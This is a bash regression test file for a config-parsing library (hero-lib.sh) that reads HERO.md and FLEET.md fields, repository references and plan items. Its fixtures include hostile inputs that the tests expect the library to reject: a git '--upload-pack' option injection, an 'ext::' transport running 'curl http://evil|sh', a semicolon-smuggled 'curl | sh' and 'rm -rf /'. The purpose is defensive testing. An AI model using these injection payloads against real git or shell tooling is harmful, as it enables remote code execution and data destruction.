#!/usr/bin/env bash
# Copyright (c) 2026 A.I. Hero, Inc.
# All Rights Reserved.

# Regression table for scripts/hero-lib.sh.
#
# Scoped deliberately: only the two functions with real failure modes are
# covered: hero_field (parses attacker-controlled repo content and feeds it to
# git/gh) and hero_ready_items (parses hand-written frontmatter and previously
# aborted the caller's shell on it). The thin wrappers around them are not
# tested; a test there would pin prose, not behavior.
#
# Every case below is one that was, or could again be, WRONG SILENTLY, the
# listing coming back empty, a value truncated, a malformed id taking the whole
# function down. Loud failures need no regression table.
#
# Usage: bash scripts/hero-lib.test.sh

set -uo pipefail

LIB="$(cd "$(dirname "$0")" && pwd)/hero-lib.sh"
# shellcheck source=/dev/null
. "$LIB" || { echo "cannot source $LIB"; exit 1; }

PASS=0
FAIL=0

check() { # name expected actual
  if [ "$2" = "$3" ]; then
    PASS=$((PASS + 1))
  else
    FAIL=$((FAIL + 1))
    printf 'FAIL  %s\n      expected: [%s]\n      actual:   [%s]\n' "$1" "$2" "$3"
  fi
}

TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT

# ---------- hero_field -----------------------------------------------------

mkdir -p "$TMP/cfg"
cat > "$TMP/cfg/HERO.md" <<'EOF'
# Hero Configuration

## Repository

- default-branch: main # the trunk
- quoted-value: "develop"
- empty-value:
- spaced-value:    padded
EOF

check "field: strips trailing comment" \
  "main" "$(hero_field default-branch "$TMP/cfg")"
check "field: strips surrounding quotes" \
  "develop" "$(hero_field quoted-value "$TMP/cfg")"
check "field: trims padding" \
  "padded" "$(hero_field spaced-value "$TMP/cfg")"

hero_field absent-key "$TMP/cfg" >/dev/null 2>&1
check "field: absent returns 1" "1" "$?"

hero_field empty-value "$TMP/cfg" >/dev/null 2>&1
check "field: present-but-empty returns 1" "1" "$?"

# Option injection: a value beginning with `-` reaches git as an OPTION.
# `git fetch origin --upload-pack=<cmd>` executes <cmd> through a shell, so a
# checked-in HERO.md in a cloned repo becomes arbitrary code execution.
cat > "$TMP/cfg/HERO.md" <<'EOF'
- default-branch: --upload-pack=touch /tmp/hero_lib_test_pwned;git-upload-pack
EOF
hero_field default-branch "$TMP/cfg" >/dev/null 2>&1
check "field: rejects leading-dash value (option injection)" "2" "$?"
check "field: rejected value falls back to main" \
  "main" "$(hero_default_branch "$TMP/cfg" 2>/dev/null)"

# ---------- fleet ----------------------------------------------------------
#
# FLEET.md rows feed `cd` in subagents, so a wrong row silently runs a skill
# in the wrong repo. Every case here is a listing that could come back
# plausible-but-wrong: the first repo's field for the second repo, an example
# from a code fence, a heading outside ## Repos.

mkdir -p "$TMP/fleet" "$TMP/nofleet/repo"
# hero_fleet_root prints a physical path; macOS mktemp hands back the /var
# symlink, so resolve the fixture the same way or every path check fails.
F="$(cd "$TMP/fleet" && pwd -P)"
mkdir -p "$F/auth" "$F/web/deep"
cat > "$F/FLEET.md" <<'EOF'
# Fleet

## Fleet

- name: acme
- port-range: 33000-33099
- port: 1 # a fleet-level key that must not leak into repo reads

### sub

- after-h3: still-fleet

## Repos

### auth

- group: Apps
- port: "33000" # claimed

#### deeper

- deep: h4-does-not-end-the-block

### web

- path: "./sites/web/"
- group: apps
- port: 33001

### absent

- path: /opt/absent

### auth

- group: apps

### ctl

- port: 1	2

### alpha

- port: abc

### outside

- path: ../

### notes

- group: none

### bad path

- path: ./x

### dashed

- path: --upload-pack=evil

## Conventions

### example

- port: 99999

```
### fenced
- port: 11111
```
EOF

# The heading's trailing spaces cannot live in this file because the
# trailing-whitespace hook strips them, so they are added after the heredoc.
awk '!done && /^### auth$/ { print "### auth   "; done = 1; next } { print }' "$F/FLEET.md" > "$F/FLEET.md.tmp" && mv "$F/FLEET.md.tmp" "$F/FLEET.md"

check "fleet-root: found from a nested dir" \
  "$F" "$(hero_fleet_root "$F/web/deep")"
check "fleet-root: the fleet folder itself" \
  "$F" "$(hero_fleet_root "$F")"
hero_fleet_root "$TMP/nofleet/repo" >/dev/null 2>&1; rc=$?
# TMP lives under a system temp dir that carries no FLEET.md, so the walk
# must reach / and fail rather than find a stray file on the way up.
check "fleet-root: absent returns 1" "1" "$rc"

hero_at_fleet_root "$F"; check "at-fleet-root: FLEET.md and no HERO.md" "0" "$?"
hero_at_fleet_root "$F/auth"; check "at-fleet-root: a repo dir is not" "1" "$?"
touch "$F/HERO.md"
hero_at_fleet_root "$F"; check "at-fleet-root: HERO.md beside FLEET.md means repo" "1" "$?"
rm "$F/HERO.md"

check "fleet-field: reads the ## Fleet section" \
  "acme" "$(hero_fleet_field name "$F")"
check "fleet-field: an H3 inside ## Fleet does not end the section" \
  "still-fleet" "$(hero_fleet_field after-h3 "$F")"
check "repo-field: a trailing-whitespace heading still matches" \
  "33000" "$(hero_fleet_repo_field auth port "$F")"
check "repo-field: an H4 does not end an H3 block" \
  "h4-does-not-end-the-block" "$(hero_fleet_repo_field auth deep "$F")"
hero_fleet_repo_field ctl port "$F" >/dev/null 2>&1
check "repo-field: a control character is refused (rc 2)" "2" "$?"
check "fleet-field: port-range is not port" \
  "1" "$(hero_fleet_field port "$F")"
check "repo-field: second repo gets its own value, not the first's" \
  "33001" "$(hero_fleet_repo_field web port "$F")"
check "repo-field: fleet-level port does not leak into a repo block" \
  "33000" "$(hero_fleet_repo_field auth port "$F")"
hero_fleet_repo_field notes port "$F" >/dev/null 2>&1
check "repo-field: absent in the block returns 1" "1" "$?"
hero_fleet_repo_field example port "$F" >/dev/null 2>&1
check "repo-field: an H3 outside ## Repos does not answer for a repo row" "1" "$?"
hero_fleet_repo_field fenced port "$F" >/dev/null 2>&1
check "repo-field: a fenced example row is skipped" "1" "$?"
hero_md_field "$F/FLEET.md" port auth >/dev/null 2>&1
check "md-field: a bare BLOCK name is rejected, not read as absent" "2" "$?"

check "repos: TSV — group lowercased, port de-quoted, comment stripped, trailing slash dropped, absolute kept, fenced/foreign rows absent" \
  "$(printf 'auth\t%s/auth\tapps\t33000\nweb\t%s/sites/web\tapps\t33001\nabsent\t/opt/absent\tnone\t\nnotes\t%s/notes\tnone\t\n' "$F" "$F" "$F")" \
  "$(hero_fleet_repos "$F" 2>/dev/null)"
check "repos: duplicate, ctrl-char, non-numeric port, outside path, space name, dashed path are each skipped" \
  "6" "$(hero_fleet_repos "$F" 2>&1 >/dev/null | grep -c skipping)"
hero_fleet_repos "$F" >/dev/null 2>&1
check "repos: skipped rows return 3, never a clean 0" "3" "$?"
check "repos: the outside-the-fleet reason names the resolved path" \
  "1" "$(hero_fleet_repos "$F" 2>&1 >/dev/null | grep -c "outside the fleet")"

# zsh ties `path` to PATH: a `local path` in the lib empties it for the
# function and awk vanishes, an empty registry with rc 0. Sourcing from
# zsh is how every SKILL.md bash block runs on macOS.
if command -v zsh >/dev/null 2>&1; then
  check "repos: sourced from zsh, still lists" \
    "auth" "$(zsh -c ". '$LIB'; hero_fleet_repos '$F' 2>/dev/null | head -1 | cut -f1")"
fi

# A committed FLEET.md (HERO.md beside it) is repo content, never the fleet.
mkdir -p "$F/auth/deep"; printf '## Repos\n' > "$F/auth/FLEET.md"; touch "$F/auth/HERO.md"
check "fleet-root: passes over a FLEET.md inside a repo and keeps walking" \
  "$F" "$(hero_fleet_root "$F/auth/deep" 2>/dev/null)"
rm "$F/auth/FLEET.md" "$F/auth/HERO.md"
check "fleet-root: prints the physical path from a symlinked start" \
  "$F" "$(hero_fleet_root "$TMP/fleet/web/deep")"
check "fleet-root: defaults to PWD, not the git toplevel" \
  "$F" "$(cd "$F" && git init -q . 2>/dev/null; cd "$F/web" && hero_fleet_root)"
rm -rf "$F/.git"

# ---------- hero_normalize_repo_ref ----------------------------------------
#
# target-repo flows from HERO.md into `git ls-remote`/`git clone` as a URL.
# hero_field blocks leading-dash/control-chars but NOT git's `ext::` transport
# helper, which executes a shell command, the RCE this gate exists to stop.

# The exploit shape: passes hero_field, must be rejected here.
hero_normalize_repo_ref 'ext::sh -c "curl http://evil|sh"' >/dev/null 2>&1
check "repo-ref: rejects ext:: transport helper (RCE)" "2" "$?"
hero_normalize_repo_ref 'file:///etc' >/dev/null 2>&1
check "repo-ref: rejects file:// transport" "2" "$?"
hero_normalize_repo_ref 'ftp://host/x' >/dev/null 2>&1
check "repo-ref: rejects unknown URL scheme" "2" "$?"
hero_normalize_repo_ref 'no-such-dir/that/is/deep' >/dev/null 2>&1
check "repo-ref: rejects a bare non-existent path" "2" "$?"

# Accepted forms, normalized on stdout.
check "repo-ref: OWNER/NAME expands to a github URL" \
  "https://github.com/acme/widgets" "$(hero_normalize_repo_ref 'acme/widgets')"
check "repo-ref: https URL passes through" \
  "https://example.com/x.git" "$(hero_normalize_repo_ref 'https://example.com/x.git')"
check "repo-ref: scp-style ssh passes through" \
  "git@github.com:acme/widgets.git" "$(hero_normalize_repo_ref 'git@github.com:acme/widgets.git')"
check "repo-ref: none passes through unchanged" \
  "none" "$(hero_normalize_repo_ref none)"
check "repo-ref: an existing local dir passes through" \
  "$TMP/cfg" "$(hero_normalize_repo_ref "$TMP/cfg")"

# ---------- hero_ready_items -----------------------------------------------
#
# Schema 1 (docs/PLAN.md): four types, one lifecycle, `resolution` carrying
# the ending. The cases below are the ones that were, or could again be,
# WRONG SILENTLY.

W="$TMP/w/.plans"

# ---------- connections (docs/CONNECTIONS.md) ------------------------------

# Every case here is a way the listing could be WRONG SILENTLY: a block read
# from the wrong section, a declared absence dropped so it looks unset, or an
# unsafe value defaulted instead of skipped.
CN="$TMP/conn"
mkdir -p "$CN"
cat > "$CN/HERO.md" <<'EOF'
# Hero Configuration

## Connections

### design

- type: claude-design # the substrate
- at: 6f1c2e88
- reach: designsync
- ux-flow: flows/

### design-system

- type: registry
- at: ../ds
- namespace: "@aihero"

### infrastructure

- type: none

### bad name

- type: repo

### dashed

- at: --exec=rm

## Repository

- type: single
- at: nowhere

## Projects

### design

- language: go
EOF

check "connection: field from its own block" \
  "claude-design" "$(hero_connection design type "$CN")"
# `type` and `at` both exist under ## Repository, and `### design` is repeated
# under ## Projects. A reader that ignores either boundary answers the wrong
# question with a plausible-looking value.
check "connection: ## Repository does not answer for a connection" \
  "registry" "$(hero_connection design-system type "$CN")"
# rc 1, explicitly: `|| echo -` would also pass on rc 2, so a boundary that
# broke by REFUSING rather than by missing would read as correct.
check "connection: a same-named block in another section is not read" \
  "1" "$(hero_connection design language "$CN" >/dev/null 2>&1; echo $?)"
check "connection: kind-specific key reads" \
  "@aihero" "$(hero_connection design-system namespace "$CN")"
check "connection: unset field is rc 1" \
  "1" "$(hero_connection design nosuchkey "$CN" >/dev/null 2>&1; echo $?)"

check "connections: row is KIND TYPE AT REACH" \
  "design	claude-design	6f1c2e88	designsync" \
  "$(hero_connections "$CN" 2>/dev/null | head -1)"
# A declared `type: none` is an ANSWER. Dropping it here would make "looked,
# there is none" indistinguishable from "nobody has looked", which is the one
# distinction the standard exists to keep.
check "connections: a declared absence is listed" \
  "infrastructure	none	-	-" \
  "$(hero_connections "$CN" 2>/dev/null | grep '^infrastructure')"
check "connections: unset at/reach print as -, never empty" \
  "design-system	registry	../ds	-" \
  "$(hero_connections "$CN" 2>/dev/null | grep '^design-system')"
check "connections: untrusted blocks are skipped, not defaulted" \
  "" "$(hero_connections "$CN" 2>/dev/null | grep -E '^(bad|dashed)' || true)"
check "connections: a skipped block returns 3" \
  "3" "$(hero_connections "$CN" >/dev/null 2>&1; echo $?)"
check "connections: each skip names the kind on stderr" \
  "2" "$(hero_connections "$CN" 2>&1 >/dev/null | grep -c 'skipping')"
# Assert the absence of the leak, not a row count: a leaked ## Projects block
# plus a skip elsewhere nets back to the same number.
check "connections: sections after ## Connections are not blocks" \
  "" "$(hero_connections "$CN" 2>/dev/null | awk -F'\t' '$1 == "design" && $2 != "claude-design"')"

# A fenced example is documentation. HERO.md documents its own syntax, and a
# block inside a fence declaring `type: figma` would otherwise be read as this
# repo's real design connection.
cat > "$CN/HERO.md" <<'EOF'
# Hero Configuration

## Connections

```markdown
### design

- type: figma
```

### issues

- type: github
- at: acme/web
EOF
check "connections: a fenced example is not a declaration" \
  "issues	github	acme/web	-" "$(hero_connections "$CN" 2>/dev/null)"

# No ## Connections at all is not an error: it is a repo nobody has looked at
# yet, and it prints nothing with rc 0.
cat > "$CN/HERO.md" <<'EOF'
# Hero Configuration

## Repository

- type: single
EOF
check "connections: no section is empty, rc 0" \
  "yes" "$(hero_connections "$CN" >/dev/null 2>&1 && echo yes || echo no)"
check "connections: no section prints nothing" \
  "" "$(hero_connections "$CN" 2>/dev/null)"
check "connections: no HERO.md is rc 1" \
  "1" "$(hero_connections "$TMP/nope" >/dev/null 2>&1; echo $?)"

# The compat read is what keeps an unmigrated repo working. Without it, a repo
# whose design target is configured the old way reports as having none, and the
# run silently drops to self-review.
cat > "$CN/HERO.md" <<'EOF'
# Hero Configuration

## Wayfare

- design-project: 6f1c2e88
- design-transport: manual

## Connections

### design

- type: claude-design
- at: aaaabbbb
EOF
check "compat: the connection wins when both exist" \
  "aaaabbbb" "$(hero_connection_compat design at design-project "$CN" 2>/dev/null)"
check "compat: falls back to the legacy key" \
  "manual" "$(hero_connection_compat design reach design-transport "$CN" 2>/dev/null)"
check "compat: the legacy read is announced" \
  "yes" "$(hero_connection_compat design reach design-transport "$CN" 2>&1 >/dev/null | grep -q "design-transport" && echo yes || echo no)"
check "compat: neither set is rc 1" \
  "1" "$(hero_connection_compat design nosuch nosuch-either "$CN" >/dev/null 2>&1; echo $?)"

# hero_connection_repo: `at` is a fleet row name where there is a fleet and a
# path otherwise, and the two must not be answered differently by different
# callers. rc 3 (set, unreachable) is deliberately not rc 1 (none).
FL="$TMP/connfleet"   # not $TMP/fleet: that fixture is git-init-ed above and reused
mkdir -p "$FL/app" "$FL/ds"
cat > "$FL/FLEET.md" <<'EOF'
# Fleet

## Fleet

- name: t

## Repos

### ds

- path: ./ds
- group: apps
EOF
conn_at() { printf '# H\n\n## Connections\n\n### design-system\n\n%s\n' "$1" > "$FL/app/HERO.md"; }

conn_at "- type: registry
- at: ds"
check "connection repo: a row name resolves through the fleet map" \
  "$(cd "$FL/ds" && pwd -P)" "$(hero_connection_repo design-system "$FL/app" 2>/dev/null)"
conn_at "- type: registry
- at: ../ds"
check "connection repo: a relative path resolves against ROOT, not cwd" \
  "$(cd "$FL/ds" && pwd -P)" "$(hero_connection_repo design-system "$FL/app" 2>/dev/null)"
conn_at "- type: registry
- at: nosuchrow"
check "connection repo: set but unreachable is rc 3, never rc 1" \
  "3" "$(hero_connection_repo design-system "$FL/app" >/dev/null 2>&1; echo $?)"
# Capture first, then grep. Piping the call straight into grep makes pipefail
# surface the function's own rc 3 as the pipeline status, and the check reads
# "no message" for a message that was printed.
ERRTXT=$(hero_connection_repo design-system "$FL/app" 2>&1 >/dev/null)
check "connection repo: the unreachable case names the kind on stderr" \
  "yes" "$(printf '%s' "$ERRTXT" | grep -q 'design-system' && echo yes || echo no)"
conn_at "- type: none"
check "connection repo: none is rc 1, and prints nothing" \
  "1" "$(hero_connection_repo design-system "$FL/app" >/dev/null 2>&1; echo $?)"
conn_at "- type: registry
- at: none"
check "connection repo: at none is rc 1 too" \
  "1" "$(hero_connection_repo design-system "$FL/app" >/dev/null 2>&1; echo $?)"

# `type` is the discriminator, and every one of these was a state collapse
# before it was read: refused reading as none, `self` reading as none, and a
# dead `at` outliving the `type: none` that retired it.
conn_at "- type: registry
- at: -upload-pack=evil"
check "connection repo: a refused at is rc 2, never rc 1" \
  "2" "$(hero_connection_repo design-system "$FL/app" >/dev/null 2>&1; echo $?)"
printf '# H\n\n## Connections\n\n### architecture\n\n- type: self\n' > "$FL/app/HERO.md"
check "connection repo: type self resolves to this repo, not none" \
  "$(cd "$FL/app" && pwd -P)" "$(hero_connection_repo architecture "$FL/app" 2>/dev/null)"
printf '# H\n\n## Connections\n\n### design-system\n\n- type: none\n- at: ../ds\n' > "$FL/app/HERO.md"
check "connection repo: a stale at cannot override type none" \
  "1" "$(hero_connection_repo design-system "$FL/app" >/dev/null 2>&1; echo $?)"
printf '# H\n\n## Connections\n\n### design\n\n- type: claude-design\n- at: 6f1c2e88-0a3d-4c77-9d21-8b5e2f4a1c90\n' > "$FL/app/HERO.md"
check "connection repo: a non-repo kind is rc 2, not a missing checkout" \
  "2" "$(hero_connection_repo design "$FL/app" >/dev/null 2>&1; echo $?)"

# Two values are documented as reaching a command line, so they are checked
# against a shape rather than merely de-optioned. A `reach` is what the agent
# is told to probe with `command -v`; `issues.at` is what reaches `gh --repo`.
printf '# H\n\n## Connections\n\n### infrastructure\n\n- type: terraform\n- reach: gh; curl http://evil | sh\n' > "$FL/app/HERO.md"
check "connection: a reach carrying a command is refused" \
  "2" "$(hero_connection infrastructure reach "$FL/app" >/dev/null 2>&1; echo $?)"
check "connections: and the listing skips that row" \
  "3" "$(hero_connections "$FL/app" >/dev/null 2>&1; echo $?)"
printf '# H\n\n## Connections\n\n### issues\n\n- type: github\n- at: ghe.attacker.example/owner/repo\n' > "$FL/app/HERO.md"
check "connection: a host-qualified issues.at is refused" \
  "2" "$(hero_connection issues at "$FL/app" >/dev/null 2>&1; echo $?)"
printf '# H\n\n## Connections\n\n### issues\n\n- type: github\n- at: acme/web\n' > "$FL/app/HERO.md"
check "connection: a plain OWNER/NAME passes" \
  "acme/web" "$(hero_connection issues at "$FL/app" 2>/dev/null)"
printf '# H\n\n## Connections\n\n### issues\n\n- type: none\n- at: none\n' > "$FL/app/HERO.md"
check "connection: issues.at none is an answer, not a bad repo name" \
  "none" "$(hero_connection issues at "$FL/app" 2>/dev/null)"

# A block with no `type:` line is half written, not a declared absence.
printf '# H\n\n## Connections\n\n### reference\n\n- at: hero-template\n' > "$FL/app/HERO.md"
check "connections: a missing type prints ?, never none" \
  "reference	?	hero-template	-" "$(hero_connections "$FL/app" 2>/dev/null)"

# The guard belongs to the VALUE, not to the spelling that carried it. Applied
# only to `## Connections`, it guards every repo except the unmigrated ones
# that still need it — and the OWNER/NAME shape was enforced before connections
# existed, so skipping it here would ship weaker than what it replaced.
printf '# H\n\n## Wayfare\n\n- design-transport: gh; curl http://evil | sh\n' > "$FL/app/HERO.md"
check "compat: a legacy reach carrying a command is refused" \
  "2" "$(hero_connection_compat design reach design-transport "$FL/app" >/dev/null 2>&1; echo $?)"
printf '# H\n\n## Wayfare\n\n- feedback-repo: ghe.attacker.example/owner/repo\n' > "$FL/app/HERO.md"
check "compat: a legacy host-qualified at is refused" \
  "2" "$(hero_connection_compat issues at feedback-repo "$FL/app" >/dev/null 2>&1; echo $?)"
printf '# H\n\n## Wayfare\n\n- design-transport: manual\n' > "$FL/app/HERO.md"
check "compat: a legal legacy value still answers" \
  "manual" "$(hero_connection_compat design reach design-transport "$FL/app" 2>/dev/null)"

# The listing and the field reader must agree about one HERO.md, or Step 0
# prints a healthy row for a value every read refuses.
printf '# H\n\n## Connections\n\n### issues\n\n- type: github\n- at: None\n' > "$FL/app/HERO.md"
check "connection: issues.at None is the sentinel, whatever its case" \
  "None" "$(hero_connection issues at "$FL/app" 2>/dev/null)"
check "connections: and the listing agrees rather than skipping it" \
  "0" "$(hero_connections "$FL/app" >/dev/null 2>&1; echo $?)"
printf '# H\n\n## Connections\n\n### issues\n\n- at: evil.example/o/r\n\n### issues\n\n- at: real/repo\n' > "$FL/app/HERO.md"
check "connections: a skipped block still marks its kind seen" \
  "" "$(hero_connections "$FL/app" 2>/dev/null | grep '^issues' || true)"

# A `type` that names a repo with no `at` is half written, not absent.
printf '# H\n\n## Connections\n\n### design-system\n\n- type: registry\n' > "$FL/app/HERO.md"
check "connection repo: a type with no at is rc 3, and says so" \
  "3" "$(hero_connection_repo design-system "$FL/app" >/dev/null 2>&1; echo $?)"
# The likeliest real fleet failure: the row is on the map, the repo was never
# cloned.
printf '# H\n\n## Connections\n\n### design-system\n\n- type: registry\n- at: ds\n' > "$FL/app/HERO.md"
mv "$FL/ds" "$FL/ds-away"
check "connection repo: a mapped row with no checkout is rc 3" \
  "3" "$(hero_connection_repo design-system "$FL/app" >/dev/null 2>&1; echo $?)"
mv "$FL/ds-away" "$FL/ds"
# Fleet-first is the rule: a row name is the map's answer, not a directory name
# that happens to sit next door.
mkdir -p "$FL/app/ds" && : > "$FL/app/ds/MARKER"
check "connection repo: the fleet row wins over a same-named local dir" \
  "$(cd "$FL/ds" && pwd -P)" "$(hero_connection_repo design-system "$FL/app" 2>/dev/null)"
rm -rf "$FL/app/ds"
printf '# H\n\n## Connections\n\n### design-system\n\n- type: registry\n- at: %s\n' "$(cd "$FL/ds" && pwd -P)" > "$FL/app/HERO.md"
check "connection repo: an absolute at resolves" \
  "$(cd "$FL/ds" && pwd -P)" "$(hero_connection_repo design-system "$FL/app" 2>/dev/null)"
# `-d` passes for a directory that cannot be entered, and rc 1 there would
# report a dropped mount as "there is no design system".
if [ "$(id -u)" != 0 ]; then
  mkdir -p "$FL/app/locked"
  chmod 000 "$FL/app/locked"
  printf '# H\n\n## Connections\n\n### design-system\n\n- type: registry\n- at: ./locked\n' > "$FL/app/HERO.md"
  check "connection repo: an unenterable dir is rc 3, not rc 1" \
    "3" "$(hero_connection_repo design-system "$FL/app" >/dev/null 2>&1; echo $?)"
  chmod 755 "$FL/app/locked"; rm -rf "$FL/app/locked"
fi

# Quote stripping reaches the listing, not only the field reader.
printf '# H\n\n## Connections\n\n### design-system\n\n- type: "registry"\n- at: "../ds"\n' > "$FL/app/HERO.md"
check "connections: quotes are stripped in the listing too" \
  'design-system	registry	../ds	-' "$(hero_connections "$FL/app" 2>/dev/null)"
printf '# H\n\n## Connections\n\n### design\n\n- type: figma\n\n### design\n\n- type: claude-design\n' > "$FL/app/HERO.md"
check "connections: first block wins, the duplicate is skipped" \
  "design	figma	-	-" "$(hero_connections "$FL/app" 2>/dev/null)"
# Capture first: piping into grep lets pipefail surface the function's rc 3 as
# the pipeline status, and the check reads "no message" for one that printed.
DUPTXT=$(hero_connections "$FL/app" 2>&1 >/dev/null)
check "connections: and the duplicate is reported" \
  "yes" "$(printf '%s' "$DUPTXT" | grep -q 'duplicate kind' && echo yes || echo no)"

# The locator's shape is the TYPE's business, not the kind's. references/init.md
# writes `type: linear` with `at: WORKSPACE_OR_OWNER/NAME`, so holding every
# issues.at to OWNER/NAME refuses the config this plugin itself generates.
printf '# H\n\n## Connections\n\n### issues\n\n- type: linear\n- at: acme-workspace\n' > "$FL/app/HERO.md"
check "connection: a linear workspace is a legal issues.at" \
  "acme-workspace" "$(hero_connection issues at "$FL/app" 2>/dev/null)"
check "connections: and the listing keeps that row" \
  "0" "$(hero_connections "$FL/app" >/dev/null 2>&1; echo $?)"
printf '# H\n\n## Connections\n\n### issues\n\n- type: linear\n- at: evil; rm -rf /\n' > "$FL/app/HERO.md"
check "connection: a workspace is still a closed shape" \
  "2" "$(hero_connection issues at "$FL/app" >/dev/null 2>&1; echo $?)"
printf '# H\n\n## Connections\n\n### issues\n\n- type: github\n- at: ghe.attacker.example/o/r\n' > "$FL/app/HERO.md"
check "connection: a github at is still held to OWNER/NAME" \
  "2" "$(hero_connection issues at "$FL/app" >/dev/null 2>&1; echo $?)"

# The mirror of the type-with-no-at case, and it must not outrank the two
# answers that are not half-written.
printf '# H\n\n## Connections\n\n### design-system\n\n- at: ../ds\n' > "$FL/app/HERO.md"
check "connection repo: an at with no type is rc 3" \
  "3" "$(hero_connection_repo design-system "$FL/app" >/dev/null 2>&1; echo $?)"
mkdir -p "$W/items"

# Every store needs a plan object; without one the listing refuses outright,
# which is its own case further down.
plan() { # STORE
  printf -- '---\nschema: 1\ndefault_branch: main\nnext_id: 999\n---\n' > "$1/PLAN.md"
}
plan "$W"

item() { # file id title status deps [type]
  {
    printf -- '---\nid: %s\n' "$2"
    printf 'type: %s\n' "${6:-task}"
    printf 'title: %s\nstatus: %s\ndepends_on: %s\n---\n' "$3" "$4" "$5"
  } > "$W/items/$1"
}

item 001-done.md 1 "Finished" "done" "[]"
item 002-todo.md 2 "Unblocked" "ready" "[1]"
item 003-blocked.md 3 "Waiting" "ready" "[2]"
item 004-active.md 4 "In flight" "active" "[1]"
item 005-pad.md 007 "Zero padded" "done" "[]"
item 006-padref.md 6 "Refs padded id" "ready" "[7]"
item 007-dangling.md 8 "Dangling ref" "ready" "[99]"
item 008-caps.md 9 "Capitalized status" "DONE" "[]"

OUT="$(hero_ready_items "$W" 2>/dev/null)"

# state_of FILE [LISTING]: the STATE column for FILE, defaulting to $OUT.
state_of() { printf '%s' "${2:-$OUT}" | awk -v f="$1" '$2 == f { print $1; exit }'; }

check "ready: satisfied dep is READY"        "READY"   "$(state_of 002-todo.md)"
check "ready: unmet dep is blocked"          "blocked" "$(state_of 003-blocked.md)"
check "ready: active is active, not READY"   "active"  "$(state_of 004-active.md)"
check "ready: done items are listed"         "done"    "$(state_of 001-done.md)"
# 007 and 7 must compare equal, or a zero-padded legacy id blocks its dependents.
check "ready: zero-padded id resolves"       "READY"   "$(state_of 006-padref.md)"
# A dangling reference must block, not silently resolve, and must SAY it is
# dangling: nothing will ever mark a nonexistent id done, so an unnamed
# dangling ref reads as ordinary waiting when it is actually forever.
check "ready: dangling dep blocks"           "blocked" "$(state_of 007-dangling.md)"
printf '%s' "$OUT" | grep -q '007-dangling.md.*\[missing dep: 99\]'
check "ready: dangling dep is named on the listing" "0" "$?"
# Capture stderr rather than piping into grep -q: with pipefail, grep's early
# exit SIGPIPEs the producer and the pipeline reports 141 despite a match.
ERR0="$(hero_ready_items "$W" 2>&1 >/dev/null)"
printf '%s' "$ERR0" | grep -q "no item carries"
check "ready: dangling dep warns on stderr" "0" "$?"
# `DONE` must count as done, or every dependent stays blocked forever.
check "ready: status match is case-insensitive" "done"  "$(state_of 008-caps.md)"

# An UNMIGRATED store must list nothing and say why. A permissive pass would
# print an empty roadmap for a repo that has a full one, and an empty roadmap
# reads as "nothing to do" rather than as "this did not work".
mkdir -p "$TMP/unmig/.plans/items"
printf -- '---\nid: 1\nkind: feature\ntitle: Old\nstatus: todo\n---\n' > "$TMP/unmig/.plans/items/001-a.md"
UNMIG="$(hero_ready_items "$TMP/unmig/.plans" 2>/dev/null)"; RCU=$?
check "schema: unmigrated store returns non-zero" "1" "$RCU"
check "schema: unmigrated store prints nothing"   ""  "$UNMIG"
ERRU="$(hero_ready_items "$TMP/unmig/.plans" 2>&1 >/dev/null)"
printf '%s' "$ERRU" | grep -q "migrate-plan.sh"
check "schema: unmigrated store names the migrator" "0" "$?"

# Ids are integers by convention, but a hand-written oddball must degrade
# gracefully: a non-numeric id used to be a FATAL arithmetic error that
# emitted NOTHING: a caller reads that as an empty plate, not as a failure.
item 009-strid.md "AH-12" "String id" "done" "[]"
item 00a-strdep.md "b3f2" "Depends on string id" "ready" "[ah-12]"
OUT2="$(hero_ready_items "$W" 2>/dev/null)"
COUNT2="$(printf '%s' "$OUT2" | grep -c . )"
check "ready: string id does not blank the listing" "10" "$COUNT2"
# Ids compare case-insensitively: `ah-12` must resolve against `AH-12`.
check "ready: string-id dep resolves case-insensitively" "READY" "$(state_of 00a-strdep.md "$OUT2")"

# The store listing is data; notes belong on stderr.
NOTE="$(hero_ready_items "$TMP/nonexistent-store" 2>/dev/null)"
check "ready: missing store prints nothing to stdout" "" "$NOTE"

# Sourced into a caller's shell, a bare `cd` reroutes every later relative path.
BEFORE="$PWD"
hero_ready_items "$W" >/dev/null 2>&1
check "ready: does not change caller's cwd" "$BEFORE" "$PWD"

# ---------- hero_item_field ------------------------------------------------

cat > "$W/items/010-colon.md" <<'EOF'
---
id: 10
type: task
title: Fix auth: token refresh
status: accepted
depends_on: []
success: e2e green: login under 30s
---
EOF

# Splitting on every ': ' truncated any value containing a colon, and
# `success` is the field a build reads to decide whether to build.
check "item_field: title keeps its colon" \
  "Fix auth: token refresh" "$(hero_item_field "$W/items/010-colon.md" title)"
check "item_field: success keeps its colon" \
  "e2e green: login under 30s" "$(hero_item_field "$W/items/010-colon.md" success)"

# ---------- silent-READY regressions ---------------------------------------
#
# Each of these reported an item as READY (or its dependent as permanently
# blocked) with nothing on stderr, so an agent would have picked up work whose
# dependencies do not exist, or skipped work that was actually unblocked.

cat > "$W/items/011-mldeps.md" <<'EOF'
---
id: 11
type: task
title: Block sequence deps
status: ready
depends_on:
  - 99
  - 100
---
EOF
# YAML block sequences are the standard list form. Only the inline form parsed,
# so this yielded "no dependencies" and the item was handed out as READY.
OUT3="$(hero_ready_items "$W" 2>/dev/null)"
check "deps: block sequence blocks" "blocked" "$(state_of 011-mldeps.md "$OUT3")"

cat > "$W/items/012-quoted.md" <<'EOF'
---
id: 12
type: task
title: Quoted status
status: "done"
depends_on: []
---
EOF
cat > "$W/items/013-dep.md" <<'EOF'
---
id: 13
type: task
title: Depends on the quoted-done item
status: ready
depends_on: [12]
---
EOF
item 015-qdep.md 15 "Quoted inline dep" "ready" '["12"]'
OUT4="$(hero_ready_items "$W" 2>/dev/null)"
# A quoted status did not equal `done`, so every dependent blocked forever.
check "status: quoted done counts as done" "done"  "$(state_of 012-quoted.md "$OUT4")"
check "status: its dependent unblocks"     "READY" "$(state_of 013-dep.md "$OUT4")"
# The inline-array parser must strip entry quotes like the block parser does,
# or `depends_on: ["12"]` emits `"12"` and never matches id 12.
check "deps: quoted inline entry resolves" "READY" "$(state_of 015-qdep.md "$OUT4")"

cat > "$W/items/014-body.md" <<'EOF'
---
id: 14
type: task
title: Body mentions a status
depends_on: []
---

Run until `status: done` appears in the log.
EOF
OUT5="$(hero_ready_items "$W" 2>/dev/null)"
# Frontmatter only, a body line must not be read as the item's own field. This
# item has no status line of its own, so it defaults to `new`; if the body's
# `status: done` were read it would show `done` instead.
check "field: body line is not frontmatter" "new" "$(state_of 014-body.md "$OUT5")"

